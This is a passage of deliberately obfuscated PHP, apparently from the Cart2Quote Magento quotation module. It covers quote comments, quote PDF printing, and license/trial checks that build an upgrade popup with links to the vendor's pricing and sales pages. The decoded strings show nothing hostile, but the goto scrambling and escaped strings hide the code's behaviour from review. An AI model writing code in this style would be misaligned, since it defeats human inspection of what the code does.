$SUp8f->getEmail(); goto NgTmE; SUb2f: Kr1T7: goto YTYy3; LScVB: Cyndz: goto Z71RH; NgTmE: if (empty($kJ7D2)) { goto vagum; } goto PqpVG; GGwFT: $pyRnz = Mage::getStoreConfig("\161\x71\x75\x6f\x74\145\141\x64\x76\137\x71\x75\157\164\x65\137\x65\x6d\x61\151\x6c\163\x2f\164\x65\155\x70\x6c\x61\164\145\x73\x2f\161\165\157\x74\145\x5f\162\x65\x71\165\145\163\164\x5f\x6e\x6f\x74\151\146\x69\143\141\164\x69\157\156", $FsnNf->getStoreId()); goto DPBL1; QsBpD: } public function addCommentAction() { goto SD0AY; QxhUo: if (!is_array($nL2u3)) { goto ELknH; } goto RZPeb; TWYn0: ELknH: goto ZCBIy; SD0AY: $hEyAL = $this->_initQuoteadv(); goto HwoNI; ZCBIy: bcKDz: goto wZ9V5; G9T45: try { goto ZkENN; JQZa4: $this->loadLayout("\145\155\x70\164\x79"); goto Ftr2D; YgYiu: Mage::dispatchEvent("\157\x70\x68\x69\x72\x61\150\137\x71\x71\x75\157\x74\145\x61\144\x76\137\x61\144\x6d\x69\x6e\137\141\144\x64\103\157\155\x6d\x65\156\x74\x5f\142\x65\146\157\x72\x65", [$xOx3u]); goto JQZa4; yCNjh: $xOx3u = $this->getRequest()->getPost("\150\x69\x73\x74\157\x72\x79"); goto YgYiu; ZkENN: $nL2u3 = false; goto yCNjh; Ftr2D: $this->renderLayout(); goto WRhiS; WRhiS: } catch (Mage_Core_Exception $Zf0h2) { $nL2u3 = ["\145\162\x72\157\x72" => true, "\155\x65\x73\163\141\x67\145" => $Zf0h2->getMessage()]; } catch (Exception $Zf0h2) { $nL2u3 = ["\145\x72\x72\157\x72" => true, "\155\x65\x73\163\141\147\x65" => $this->__("\103\x61\156\40\156\157\164\x20\141\x64\x64\40\161\165\157\x74\145\40\150\x69\163\x74\x6f\x72\171\x2e")]; Mage::log("\x45\x78\x63\145\x70\164\151\x6f\156\72\40" . $Zf0h2->getMessage(), null, "\143\62\x71\137\145\x78\x63\x65\160\164\x69\x6f\x6e\x2e\x6c\x6f\147", true); } goto QxhUo; wZ9V5: Mage::dispatchEvent("\x6f\160\150\151\162\141\x68\x5f\161\x71\165\x6f\x74\145\141\x64\166\137\141\144\x6d\151\x6e\137\141\x64\144\x43\157\x6d\155\x65\156\x74\137\x61\146\164\145\x72", []); goto u7ZeY; RZPeb: $nL2u3 = Zend_Json::encode($nL2u3); goto smSsO; HwoNI: if (!$hEyAL) { goto bcKDz; } goto G9T45; smSsO: $this->getResponse()->setBody($nL2u3); goto TWYn0; u7ZeY: } protected function _initQuoteadv() { goto QScVV; QScVV: $vuQ04 = $this->getRequest()->getParam("\x71\165\x6f\x74\x65\x5f\x69\x64"); goto FB_Oc; stfG3: $this->_getSession()->addError($this->__("\124\x68\151\163\x20\161\165\157\x74\x65\x20\x6e\157\x20\154\x6f\156\x67\145\162\40\145\x78\x69\163\164\x73\56")); goto qoeud; FB_Oc: $hEyAL = $this->getQuotationQuote($vuQ04); goto U6Z5I; U6Z5I: if ($hEyAL->getId()) { goto gfgUb; } goto stfG3; sdXUP: Mage::register("\x71\161\x75\157\164\x65\x5f\x64\141\164\x61", $hEyAL); goto rgAeh; HQGJI: gfgUb: goto sdXUP; JnOcF: $this->setFlag('', self::lq8Yo, true); goto ycfbQ; rgAeh: return $hEyAL; goto YZqNI; qoeud: $this->_redirect("\x2a\57\x2a\x2f"); goto JnOcF; ycfbQ: return false; goto HQGJI; YZqNI: } public function pdfqquoteadvAction() { goto kuIJW; VtKrM: foreach ($VL1OD as $oKO1P) { goto r2h7O; Pk6Rk: xaqkB: goto FVbev; S2SGT: $hewCg[] = $zjhFp->getData("\155\145\x73\x73\x61\147\x65"); goto Pk6Rk; r2h7O: $zjhFp = Mage::helper("\x71\161\165\x6f\x74\x65\141\x64\x76")->isInStock($oKO1P->getData("\160\x72\x6f\144\165\x63\x74\137\151\144")); goto m1Vgt; FVbev: ln1Pr: goto foIyE; m1Vgt: if (!$zjhFp->getData("\x68\141\x73\137\x65\162\162\x6f\162")) { goto xaqkB; } goto S2SGT; foIyE: } goto EpbUH; gfeb3: nZDqK: goto fRe6W; dyizh: $this->_getSession()->addError($this->__("\124\150\x65\x72\145\40\x61\x72\x65\40\156\x6f\x20\160\x72\x69\156\164\x61\x62\x6c\x65\x20\144\157\143\x75\155\x65\x6e\164\x73\40\162\145\x6c\141\164\x65\144\x20\164\157\40\163\145\154\145\143\x74\145\144\x20\161\x75\157\164\x65\163")); goto r_NOS; xsKgJ: Mage::dispatchEvent("\x6f\160\150\x69\162\x61\150\137\x71\161\165\157\x74\x65\x61\144\x76\137\141\x64\x6d\151\x6e\x5f\x70\x64\x66\161\161\165\x6f\x74\x65\x61\x64\x76\x5f\141\x66\164\x65\162", [$Ia31n]); goto VZ62k; VavP1: $VJbUZ = Mage::getModel("\x71\x71\x75\157\x74\145\x61\x64\x76\x2f\x70\x64\146\x5f\161\161\x75\x6f\164\145")->getPdf($VL1OD); goto GGfYT; Ds13x: tdMEt: goto TfFBE; ok8Rl: goto xPiLi; goto gfeb3; snnqK: if (!($this->getRequest()->getPost() && $this->F_sgo === false)) { goto zKdBN; } goto SRjmi; Dlw1X: $Rq0Gf = Mage::getModel("\161\x71\165\x6f\x74\145\x61\x64\166\x2f\x70\x64\146\x5f\x71\x71\x75\x6f\164\x65")->getPdf($FsnNf); goto aoWUu; I5lsM: f3Mjn: goto Ds13x; V9cHb: $BzVd7 = true; goto eC5YJ; eC5YJ: if (!isset($Rq0Gf)) { goto nZDqK; } goto VavP1; EpbUH: J2q8t: goto PIM2N; kUL9l: $VL1OD = Mage::getModel("\x71\x71\165\157\164\x65\x61\144\x76\57\x71\161\141\144\166\160\x72\x6f\x64\165\143\164")->getCollection()->addFieldToFilter("\161\165\x6f\x74\x65\x5f\x69\x64", $Ia31n)->load(); goto VtKrM; Xazdv: if (!$VL1OD->getSize()) { goto pzIiB; } goto V9cHb; GGfYT: $Rq0Gf->U5HrD = array_merge($Rq0Gf->U5HrD, $VJbUZ->U5HrD); goto ok8Rl; TzBsx: $HYkyg = array_merge($HYkyg, $hewCg); goto mkfMK; KMfIn: KXp20: goto idAuU; GP6Tn: iJDRo: goto eUVRn; ZaidP: Nn14k: goto aKu6b; rj_S0: $aauKa = Mage::helper("\161\x71\165\x6f\164\145\x61\x64\x76")->__("\120\162\151\143\145\137\160\162\157\160\x6f\x73\141\x6c\137\45\163", $YBSdJ); goto vq3c6; Y2mNF: $BzVd7 = false; goto SlbP1; C4HnS: $Ia31n = $this->getRequest()->getParam("\151\144"); goto u6WNl; u2lOH: Zou3V: goto xe35M; TfFBE: if (!count($hewCg)) { goto KXp20; } goto uCk2T; hFn8a: $Fj7q1 = $this->saveAction(); goto Wv0M4; Wv0M4: if (!(!empty($Fj7q1) && !is_object($Fj7q1))) { goto iJDRo; } goto AK8Uq; idAuU: if (!(!isset($ZSfZh) || empty($ZSfZh))) { goto Zou3V; } goto okH_e; u9a9i: u5Ald: goto KMfIn; cNFzp: pzIiB: goto VSUSj; eUVRn: $this->setFlag("\161\161\x75\x6f\x74\145\x61\144\166", "\x70\x72\151\x6e\x74", false); goto iwTMw; Mk1Pu: goto wJGmo; goto ZaidP; okH_e: $ZSfZh = "\x2a\57\x2a\57"; goto u2lOH; r_NOS: $this->_redirect("\52\x2f\x2a\x2f"); goto Mk1Pu; kuIJW: $HYkyg = []; goto cv99L; aKu6b: $YBSdJ = $FsnNf->getIncrementId(); goto rj_S0; SRjmi: $this->setFlag("\x71\161\x75\x6f\164\145\141\144\166", "\160\162\x69\x6e\x74", true); goto Lj4fO; fRe6W: $FsnNf->collectTotals(); goto Dlw1X; mkfMK: foreach ($HYkyg as $WzFf2) { Mage::getSingleton("\141\144\x6d\151\156\150\164\x6d\154\x2f\163\145\x73\163\x69\157\x6e")->addError($WzFf2); AVjaa: } goto u9a9i; SlbP1: if (!(!empty($Ia31n) && !$hewCg)) { goto tdMEt; } goto Q3y_B; u6WNl: Mage::dispatchEvent("\157\160\150\151\x72\x61\150\137\161\x71\x75\157\x74\145\x61\x64\166\x5f\x61\144\155\151\156\137\160\144\x66\161\x71\x75\157\164\x65\x61\x64\x76\x5f\x62\x65\x66\x6f\162\145", [$Ia31n]); goto Y2mNF; uCk2T: $ZSfZh = "\52\x2f\52\57\x65\x64\x69\x74\x2f\x69\144\x2f" . $Ia31n; goto TzBsx; Q3y_B: $FsnNf = $this->getQuotationQuote($Ia31n); goto kUL9l; AK8Uq: $hewCg = $Fj7q1; goto GP6Tn; Lj4fO: $this->ybeW8 = $this->getRequest()->getPost(); goto hFn8a; cv99L: $hewCg = []; goto snnqK; VZ62k: return null; goto fU5P7; xe35M: $this->_redirect($ZSfZh); goto xsKgJ; mUF5W: wJGmo: goto I5lsM; PIM2N: if (!(count($hewCg) < 144/144)) { goto f3Mjn; } goto Xazdv; VSUSj: if ($BzVd7 && isset($Rq0Gf)) { goto Nn14k; } goto dyizh; iwTMw: zKdBN: goto C4HnS; aoWUu: xPiLi: goto cNFzp; vq3c6: return $this->_prepareDownloadResponse($aauKa . "\x2e\x70\144\x66", $Rq0Gf->render(), "\141\x70\x70\x6c\x69\143\x61\x74\151\x6f\x6e\x2f\x70\144\146"); goto mUF5W; fU5P7: } public final function isTrialVersion($OpJs6 = null) { return Mage::helper("\161\x71\x75\157\164\x65\141\x64\x76\x2f\x6c\x69\x63\145\156\x73\145")->isTrialVersion($OpJs6); } public function getMsgToUpgrade($q7uMd = false, $RHhyg = 0) { goto qfd1h; Lumdf: if (!($YLroU == '')) { goto ASWE6; } goto ucb8M; CaDQH: $iVYxS = "\150\141\x73\40\x62\x65\145\156\x20\x64\151\x73\x61\x62\154\145\144"; goto GzfOA; NeSRu: wCu_w: goto JOdE4; qfd1h: $OpJs6 = Mage::registry("\143\x72\x65\141\x74\x65\x48\141\163\150"); goto Qmbb3; lM9Lo: $saWNC = floor($CkJEM / (32760/546 * 21480/358 * 15408/642)); goto VeIi4; uEBpJ: $dgNOC = Mage::helper("\161\x71\165\157\164\x65\x61\144\x76\x2f\154\x69\143\145\x6e\x73\145")->getC2QExpiryDate(); goto p5Sxi; Jk_KZ: $grf6v = "\150\x69\x64\145\102\157\170\50\x29"; goto VZk8c; NuSSj: $CFVXR .= "\x3c\x2f\144\151\166\76"; goto FE3JV; RAmS5: $GKV2j = "\x3c\x64\151\x76\x20\143\x6c\x61\x73\163\75\x22\x63\x32\x71\55\141\x63\164\x69\166\x61\x74\x65\x2d\160\x6f\160\165\x70\x22\x3e"; goto iFcf7; A7Mem: $HDp_R = "\74\x62\x75\164\x74\157\156\40\164\141\x72\147\x65\x74\75\42\137\x62\154\141\x6e\x6b\x22\x20\146\x6f\162\x6d\164\x61\162\x67\x65\164\75\x22\137\x62\x6c\141\x6e\x6b\x22\40\143\154\x61\163\x73\x3d\42\x62\x75\x74\164\x6f\156\40\142\x75\164\164\157\156\62\x22\x20\164\x69\x74\154\145\x3d\42\120\165\162\x63\x68\141\163\x65\40\x61\x20\154\x69\x63\x65\x6e\163\145\x22\x20\157\156\x63\154\x69\x63\x6b\x3d\x22\x64\x6f\143\x75\x6d\145\x6e\164\x2e\x6c\x6f\x63\x61\x74\151\x6f\156\56\x68\162\x65\146\75\x27\150\164\164\160\x73\x3a\57\57\x77\x77\x77\56\143\x61\x72\x74\x32\x71\165\157\164\145\56\x63\157\x6d\x2f\x6d\x61\147\145\x6e\x74\157\x2d\x71\x75\157\164\x61\x74\x69\157\156\x2d\155\157\x64\165\x6c\x65\55\x70\162\151\x63\151\156\x67\56\150\x74\x6d\154\77\165\x74\x6d\137\163\157\165\x72\143\145\75\103\x6c\x69\145\x6e\164\x5f\x57\x65\142\x73\151\x74\x65\46\x75\x74\155\x5f\155\x65\144\x69\x75\155\75\x50\x6f\160\x75\x70\137\x74\x72\x69\x61\154\x54\x65\x78\164\x26\x75\x74\x6d\137\143\x61\155\160\x61\x69\147\156\75\103\x6c\x69\145\x6e\164\x5f\127\x65\142\163\x69\164\145\x5f\x55\x70\x67\162\141\144\x65\x27\42\x3e" . $this->__("\123\x65\x65\40\x50\154\141\x6e\x73\x20\x61\x6e\x64\x20\120\162\151\143\x69\x6e\x67") . "\x3c\57\x62\165\x74\x74\157\x6e\x3e\40"; goto AvUhZ; g9UsE: $CFVXR .= "\74\163\x63\x72\151\160\x74\x20\164\x79\x70\145\75\x22\164\145\170\164\x2f\x6a\x61\x76\141\x73\143\x72\151\160\x74\x22\x3e\144\x6f\143\165\x6d\x65\x6e\164\56\x6f\x62\x73\x65\162\166\x65\x28\x27\x64\157\155\72\x6c\x6f\x61\x64\x65\144\47\x2c\x20\146\165\156\x63\x74\151\x6f\156\50\x29\173\12\x20\x20\x20\x20\40\x20\40\40\40\40\40\x20\40\40\x20\x20\40\x20\x20\x20\151\156\151\164\115\x73\x67\50\x29\x3b\xa\40\x20\x20\40\40\x20\x20\40\40\40\40\x20\x20\40\40\x20\x20\x7d\51\x3b\74\x2f\163\143\162\151\160\164\76"; goto LeqWA; lRdvx: $grf6v = "\x68\x69\x64\145\102\157\x78\x28\x29"; goto m4NWO; tvpvt: $vg_E6 = "\x3c\142\x75\164\164\x6f\x6e\x20\x74\141\x72\x67\145\x74\x3d\42\x5f\142\154\x61\156\x6b\42\40\146\x6f\x72\155\164\x61\162\147\145\x74\x3d\42\137\142\x6c\x61\x6e\153\42\40\143\154\141\163\x73\x3d\x22\x62\x75\164\164\x6f\156\x20\142\165\x74\x74\157\x6e\62\x20\x66\x6c\157\x61\164\154\145\146\x74\42\40\x74\151\164\154\x65\75\x22\x43\157\156\164\x61\143\x74\x20\123\x61\154\145\163\x22\x20\157\x6e\x63\154\x69\x63\x6b\75\x22\x64\157\143\x75\x6d\145\156\164\x2e\x6c\157\x63\x61\x74\x69\x6f\x6e\56\x68\x72\x65\x66\75\47\x68\164\164\160\163\x3a\57\x2f\143\x61\162\164\62\161\165\157\x74\x65\163\141\154\145\163\56\172\145\x6e\x64\145\163\x6b\x2e\x63\x6f\155\x2f\x68\x63\x2f\x65\x6e\55\165\163\x2f\162\x65\161\x75\x65\163\164\x73\57\156\x65\167\x27\x22\x3e" . $this->__("\103\157\x6e\x74\141\x63\x74\40\x53\x61\x6c\145\163") . "\x3c\x2f\x62\165\164\164\x6f\156\76\x20"; goto XLmKg; WwieW: $CFVXR .= $zbdl6; goto NgX_a; sWXVP: $grf6v = "\x68\151\x73\x74\157\x72\x79\56\142\141\x63\153\50\51"; goto TTqor; UJ0FY: $vg_E6 = "\74\142\x75\164\164\157\x6e\40\x63\154\x61\163\163\x3d\42\x62\x75\x74\x74\x6f\x6e\40\x62\165\x74\x74\157\x6e\x31\40\146\x6c\157\141\164\x6c\x65\146\x74\x22\40\164\151\x74\154\145\75\42\103\x6f\x6e\x74\x69\x6e\x75\x65\x20\124\x72\151\x61\x6c\x22\x20\150\x72\x65\146\75\x22\42\x20\x6f\156\143\154\x69\143\x6b\75\x22" . $grf6v . "\42\x3e" . $this->__("\x43\157\x6e\x74\x69\156\x75\145\x20\124\162\151\x61\x6c") . "\x3c\57\x62\x75\x74\164\x6f\156\76"; goto A7Mem; EZKZ6: $CFVXR .= "\x20\40\x20\40\x20\40\40\x20\40\40\x20\x3c\141\40\157\x6e\x63\154\151\143\x6b\x3d\x22" . $grf6v . "\x22\40\x69\x64\x3d\x22\161\165\157\x74\x65\141\x64\166\x2d\x62\x6f\170\55\x68\x65\x61\144\145\x72\x2d\x63\x6c\x6f\163\x65\x2d\142\164\x6e\x22\x3e\74\x2f\141\x3e"; goto QAuAe; rPKLf: $grf6v = "\150\151\144\145\102\157\x78\50\x29"; goto UJ0FY; a2iZO: if ($this->isTrialVersion($OpJs6) && !$this->BDJ1g()) { goto A7q1D; } goto b66SZ; iFcf7: $uLeDu = "\74\57\144\151\166\x3e"; goto F2xkz; atOmC: if (!$eeFn6) { goto CI2ai; } goto aKQuY; oWsol: $CFVXR .= "\x20\x20\40\40\x20\x20\x20\74\x64\x69\x76\x20\143\154\x61\x73\x73\x3d\x22\164\145\170\x74\x22\x20\x3e" . $YLroU . "\x3c\57\144\x69\x76\x3e"; goto atOmC; VeIi4: $r2r72 = $this->__("\104\x65\166\x65\154\x6f\160\x6d\x65\156\x74\40\x54\162\x69\x61\154"); goto RAmS5; oNEL6: $CFVXR .= "\40\x20\x20\x20\x20\40\40\74\57\x64\151\x76\x3e"; goto oWsol; jAQMq: $HDp_R = "\x3c\x62\165\x74\164\x6f\x6e\x20\x74\x61\x72\147\145\164\75\42\x5f\x62\x6c\141\x6e\x6b\42\40\x66\x6f\x72\155\x74\141\x72\x67\x65\164\75\42\x5f\142\154\x61\x6e\x6b\x22\40\143\x6c\141\163\x73\x3d\x22\x62\x75\164\164\157\156\x20\142\x75\x74\x74\157\156\62\42\40\x74\x69\164\154\x65\x3d\x22\125\x70\x67\162\x61\x64\x65\x22\40\x6f\156\x63\x6c\151\x63\153\x3d\42\144\157\x63\165\x6d\x65\156\164\56\154\157\143\x61\x74\x69\157\x6e\56\150\x72\145\146\x3d\x27\x68\164\x74\160\163\72\x2f\57\167\x77\x77\x2e\x63\141\162\x74\62\161\x75\x6f\164\145\x2e\143\x6f\x6d\x2f\x6d\141\x67\145\156\164\x6f\55\161\165\157\x74\x61\164\x69\157\156\55\x6d\x6f\x64\165\x6c\x65\x2d\x70\x72\151\x63\x69\x6e\x67\x2e\x68\164\155\x6c\x3f\x75\164\155\137\x73\157\x75\162\143\145\75\x43\x6c\151\145\x6e\164\137\127\x65\142\163\151\164\145\46\x75\x74\x6d\x5f\155\x65\x64\x69\165\155\x3d\x50\157\160\165\160\137\x77\162\157\x6e\x67\x4c\x69\143\145\x6e\x73\x65\124\145\x78\x74\46\165\164\x6d\x5f\x63\x61\x6d\160\x61\151\x67\156\75\103\154\151\x65\x6e\x74\137\127\145\142\x73\x69\164\145\137\125\160\147\162\x61\x64\145\47\x22\x3e" . $this->__("\x53\145\145\40\x50\x6c\141\x6e\x73\40\x61\x6e\x64\x20\x50\x72\151\x63\151\156\x67") . "\74\x2f\x62\165\x74\x74\x6f\x6e\x3e\40"; goto U8dU9; mX9Ug: if (Mage::helper("\161\x71\x75\x6f\164\145\141\144\x76\x2f\x6c\x69\x63\145\156\163\145\x63\x68\145\143\x6b\163")->showFreeUserOptions()) { goto KdD5h; } goto a2iZO; F1NwY: $CFVXR .= "\74\x2f\x64\x69\166\76"; goto g9UsE; ptXLe: $r2r72 = ''; goto Jk_KZ; y3Y71: if ($dgNOC > date("\131\x6d\144")) { goto wUZYQ; } goto IpgWK; bB4bW: $uLeDu = ''; goto kOfj_; nObf7: $CFVXR .= "\x3c\144\151\x76\40\143\154\141\x73\163\75\42\x62\x75\x74\164\157\156\x2d\x63\x6f\x6e\x74\x61\151\x6e\x65\x72\x22\x3e"; goto Hwbut; QAuAe: $CFVXR .= "\x3c\x64\x69\x76\40\x63\154\x61\x73\163\75\42\164\x65\x78\164\x2d\143\157\156\x74\x65\x6e\x74\42\76"; goto e5QMd; b66SZ: if (!$this->QxAac($RHhyg)) { goto kV1mv; } goto oiVhJ; kOfj_: $vg_E6 = ''; goto Uz0V2; LeqWA: Mage::unregister("\x63\162\x65\141\164\x65\110\x61\163\x68"); goto dHEvw; dHEvw: if (!(!is_array($OpJs6) || empty($OpJs6[0]) && empty($OpJs6[227/227]))) { goto wCu_w; } goto Lumdf; SpPJI: wUZYQ: goto CaDQH; TTqor: $r2r72 = $this->__("\120\x6c\x65\141\163\145\x20\x55\x70\x67\x72\141\144\145"); goto KTqcb; AnImB: $vg_E6 = "\74\142\165\164\x74\x6f\x6e\40\x63\x6c\x61\x73\x73\x3d\x22\x62\x75\164\x74\x6f\156\x20\142\x75\164\164\157\156\61\x22\40\164\151\x74\154\x65\x3d\42\103\157\156\164\x69\x6e\x75\145\x22\x20\157\156\x63\154\151\143\153\75\x22" . $grf6v . "\42\x3e" . $this->__("\x4e\x6f\x74\x20\116\x6f\167") . "\x3c\x2f\x62\x75\164\164\157\x6e\76"; goto jAQMq; F2xkz: $Z6vwI = sprintf("\45\x64", $saWNC); goto PIRTc; e5QMd: $CFVXR .= "\x20\x20\40\40\40\x20\40\x3c\144\x69\166\x20\151\144\75\42\x71\165\x6f\164\x65\141\144\166\55\x62\x6f\170\x2d\150\x65\x61\144\145\162\42\76"; goto vr2gt; Hwbut: $CFVXR .= $vg_E6; goto WwieW; oij7h: $zbdl6 = ''; goto f7VcH; rVgcu: CI2ai: goto b5lV7; Uz0V2: $HDp_R = ''; goto oij7h; JOdE4: return $CFVXR; goto dmw3d; IpgWK: $iVYxS = "\x68\x61\x73\x20\x65\170\x70\x69\162\145\x64\40\157\156\x20" . substr($dgNOC, 924/154, 1754/877) . "\x2e" . substr($dgNOC, 644/161, 894/447) . "\56" . substr($dgNOC, 0, 2576/644); goto hblkb; f7VcH: $eeFn6 = false; goto RsvvC; PIRTc: $YLroU = $this->__(Mage::helper("\x71\161\165\157\x74\x65\x61\x64\166\57\154\151\143\145\156\163\x65\143\x68\145\x63\153\163")->lT3km, $Z6vwI); goto rPKLf; fWtKS: $YLroU = $this->__(Mage::helper("\x71\x71\x75\x6f\x74\x65\x61\144\166\57\154\151\x63\x65\156\x73\x65\143\150\145\143\x6b\x73")->zhgpp); goto sWXVP; R_s3C: A7q1D: goto uEBpJ; Dhgrv: $uLeDu = "\x3c\x2f\x64\151\166\x3e"; goto tvpvt; D_og7: $uLeDu = "\x3c\x2f\x64\151\x76\76"; goto AnImB; RsvvC: $YLroU = ''; goto mX9Ug; fWNSL: MxS59: goto ruGlx; Qmbb3: $CFVXR = "\12\40\x20\x20\x20\40\x20\x20\x20\x3c\163\164\171\154\145\76\12\xa\40\x20\x20\40\x20\40\x20\40\x23\x71\165\x6f\x74\x65\141\144\166\x2d\142\157\x78\x2d\x68\145\141\x64\145\162\40\x7b\xa\xa\x20\x20\40\x20\40\x20\40\x20\175\12\x20\40\40\x20\40\40\40\x20\x2e\154\x65\x69\x67\150\x74\x62\157\170\61\40\56\164\145\x78\164\x20\x7b\12\xa\x20\40\40\40\40\x20\40\40\x7d\12\x20\x20\40\40\40\x20\x20\x20\x23\x6f\166\x65\x72\154\x61\x79\54\40\43\157\x76\x65\162\154\141\x79\154\x69\156\x6b\x7b\12\x20\x20\x20\x20\x20\40\40\40\x20\x20\40\x20\x64\x69\x73\160\x6c\x61\x79\72\156\157\156\145\x3b\xa\40\x20\x20\40\40\x20\x20\x20\x20\40\40\x20\x70\x6f\x73\151\164\151\157\156\x3a\x61\142\163\157\154\x75\x74\x65\x3b\xa\40\40\40\x20\x20\40\x20\x20\40\x20\x20\40\x74\x6f\x70\72\x30\73\12\x20\40\40\x20\40\x20\x20\40\x20\40\x20\40\154\145\146\164\72\60\73\xa\x20\x20\x20\40\x20\40\x20\x20\x20\x20\x20\40\167\151\144\164\150\72\x31\60\60\45\73\12\x20\40\x20\40\x20\x20\x20\40\x20\x20\x20\40\150\x65\151\x67\150\x74\x3a\x32\x30\x30\x25\73\12\x20\x20\40\x20\x20\40\40\x20\x20\x20\40\40\x7a\55\151\x6e\x64\145\170\x3a\61\x30\x30\60\73\xa\40\40\x20\x20\40\x20\40\x20\40\40\x20\x20\142\141\x63\153\x67\162\157\x75\x6e\x64\55\143\157\154\157\x72\x3a\43\63\x33\63\73\xa\x20\x20\40\x20\x20\x20\40\x20\40\40\40\x20\x2d\x6d\157\172\x2d\x6f\x70\x61\x63\x69\x74\x79\x3a\40\x30\x2e\70\x3b\xa\40\40\x20\x20\x20\40\x20\x20\x20\40\40\40\x6f\160\x61\143\x69\164\x79\x3a\x2e\x38\x30\73\xa\40\40\40\x20\x20\40\x20\x20\40\40\40\40\146\x69\x6c\x74\x65\x72\72\40\141\154\x70\150\x61\x28\157\160\141\x63\x69\164\x79\75\x38\60\51\73\12\x20\40\x20\x20\x20\x20\x20\x20\x7d\xa\12\x20\40\40\40\x20\40\40\x20\x3c\57\x73\164\x79\154\x65\x3e\12\xa\40\x20\40\40\40\x20\40\x20\x3c\163\143\x72\151\160\164\x20\164\x79\160\145\75\x22\164\145\x78\x74\x2f\x6a\x61\x76\141\163\143\x72\151\160\164\42\76\12\x20\x20\x20\40\x20\40\40\40\x66\165\x6e\143\164\x69\x6f\x6e\x20\x70\162\145\x70\x61\x72\145\111\105\x28\x68\x65\x69\x67\150\164\54\40\x6f\x76\x65\x72\x66\x6c\x6f\x77\x29\x20\x7b\12\40\x20\x20\x20\x20\40\40\x20\x20\40\x20\40\x62\157\x64\40\x3d\40\144\157\143\165\155\145\x6e\164\56\147\x65\164\x45\154\x65\155\145\156\x74\163\102\171\124\x61\147\x4e\x61\155\x65\x28\47\142\x6f\144\x79\x27\x29\133\x30\x5d\x3b\12\x20\40\40\x20\40\x20\40\x20\x20\x20\40\40\142\157\144\x2e\163\164\x79\154\x65\56\150\x65\151\x67\x68\164\x20\75\40\150\145\x69\x67\x68\x74\73\xa\x20\40\x20\40\40\40\40\x20\40\x20\x20\x20\x62\157\144\56\x73\164\x79\x6c\x65\56\157\166\x65\x72\146\154\157\x77\x20\x3d\40\157\166\145\x72\x66\x6c\157\x77\x3b\xa\40\x20\40\x20\12\x20\40\x20\x20\40\40\40\x20\x20\x20\x20\x20\x68\164\155\x20\x3d\40\144\x6f\x63\165\155\x65\156\x74\x2e\x67\x65\164\x45\x6c\145\155\x65\156\x74\x73\x42\171\x54\x61\147\x4e\141\x6d\x65\x28\x27\150\x74\x6d\x6c\x27\x29\133\60\x5d\73\xa\x20\x20\x20\x20\x20\x20\40\40\x20\40\x20\40\x68\164\x6d\x2e\163\x74\171\x6c\145\56\150\145\x69\147\x68\x74\x20\75\40\150\145\x69\147\x68\x74\73\12\40\x20\x20\40\x20\40\x20\40\x20\x20\40\40\150\x74\155\x2e\x73\164\171\x6c\x65\x2e\x6f\x76\145\x72\146\x6c\157\167\40\x3d\40\157\166\x65\x72\146\154\157\167\x3b\12\40\x20\40\x20\40\x20\40\x20\x7d\xa\xa\40\40\40\x20\x20\40\x20\x20\146\x75\x6e\143\164\151\x6f\x6e\40\x69\x6e\x69\x74\115\x73\x67\50\x29\40\173\12\x20\40\40\x20\x20\x20\x20\40\x20\40\x20\x20\x62\x6f\x64\40\x9\x9\x9\11\x3d\x20\x64\157\x63\x75\x6d\x65\x6e\164\x2e\x67\145\164\105\x6c\x65\155\x65\x6e\164\163\102\x79\124\141\x67\x4e\141\x6d\x65\x28\x27\x62\157\x64\171\x27\x29\x5b\x30\x5d\x3b\12\40\40\x20\40\40\40\40\40\40\40\x20\40\x6f\166\145\162\x6c\141\171\40\11\x9\11\75\40\x64\157\x63\165\x6d\145\x6e\164\x2e\x63\x72\145\x61\x74\145\105\154\x65\x6d\145\156\x74\50\x27\x64\x69\166\x27\x29\x3b\xa\40\40\40\x20\40\40\40\x20\x20\x20\40\40\157\166\x65\162\x6c\141\x79\56\x69\144\x9\11\x9\x3d\x20\47\x6f\x76\145\162\x6c\x61\x79\x27\73\12\40\40\40\40\40\40\40\x20\40\40\x20\40\142\x6f\144\56\x61\x70\160\145\x6e\144\103\x68\151\154\144\50\157\x76\x65\x72\x6c\x61\171\51\73\12\40\x20\40\x20\40\40\40\x20\40\40\x20\40\x24\x28\x27\x6f\x76\145\x72\x6c\141\x79\47\51\x2e\x73\164\x79\x6c\x65\x2e\144\x69\x73\160\x6c\x61\x79\x20\x3d\40\47\x62\x6c\157\x63\153\x27\73\12\40\x20\x20\40\40\x20\x20\40\40\x20\40\40\x24\x28\x27\154\x69\x67\x68\164\x62\157\x78\x31\47\51\56\163\x74\171\x6c\145\56\x64\151\163\x70\154\x61\x79\40\75\40\47\142\154\157\x63\153\47\x3b\12\40\40\x20\40\40\x20\x20\40\40\40\x20\40\x70\x72\145\160\141\x72\x65\x49\105\x28\42\141\x75\x74\x6f\42\x2c\40\42\x61\165\164\157\x22\x29\73\xa\40\x20\40\40\x20\40\x20\40\175\12\xa\x20\40\40\x20\x20\40\40\x20\x66\165\x6e\x63\164\151\x6f\156\40\x68\151\144\x65\x42\x6f\170\x28\51\x20\173\12\x20\x20\40\x20\40\x20\40\40\x20\40\40\x20\x24\50\47\154\151\x67\x68\164\x62\x6f\170\61\x27\x29\56\163\164\x79\154\145\56\x64\151\163\160\x6c\x61\x79\40\75\x20\x27\x6e\157\x6e\x65\x27\73\xa\40\40\40\40\x20\40\x20\40\x20\40\40\x20\x24\50\x27\157\x76\145\162\154\x61\171\x27\x29\56\x73\164\x79\x6c\145\x2e\x64\151\163\x70\154\141\171\x20\x3d\x20\x27\156\x6f\x6e\x65\47\73\xa\x20\40\40\x20\40\40\40\x20\x7d\12\12\40\40\x20\40\40\x20\x20\x20\x3c\x2f\x73\x63\x72\x69\160\164\76"; goto ptXLe; ruGlx: $CFVXR .= "\x3c\x64\x69\x76\40\x69\144\75\x22\154\151\147\x68\164\142\157\170\x31\x22\40\143\x6c\x61\x73\x73\x3d\42\x6c\x65\151\x67\150\164\142\x6f\x78\x31\x22\x20\163\x74\171\154\x65\75\42\144\151\x73\x70\x6c\141\x79\72\156\157\x6e\x65\x3b\42\x3e"; goto iO7w8; vr2gt: $CFVXR .= $r2r72; goto oNEL6; wUIoL: $CkJEM = abs(strtotime($dgNOC) - strtotime($P_7YZ)); goto lM9Lo; b5lV7: $CFVXR .= "\74\57\x64\x69\166\x3e"; goto nObf7; GzfOA: oKOBj: goto LtWEN; l3wd9: goto MxS59; goto R_s3C; AvUhZ: goto MxS59; goto V1Pvb; oiVhJ: goto MxS59; goto i0Uz2; VZk8c: $GKV2j = ''; goto bB4bW; FE3JV: $CFVXR .= $uLeDu; goto 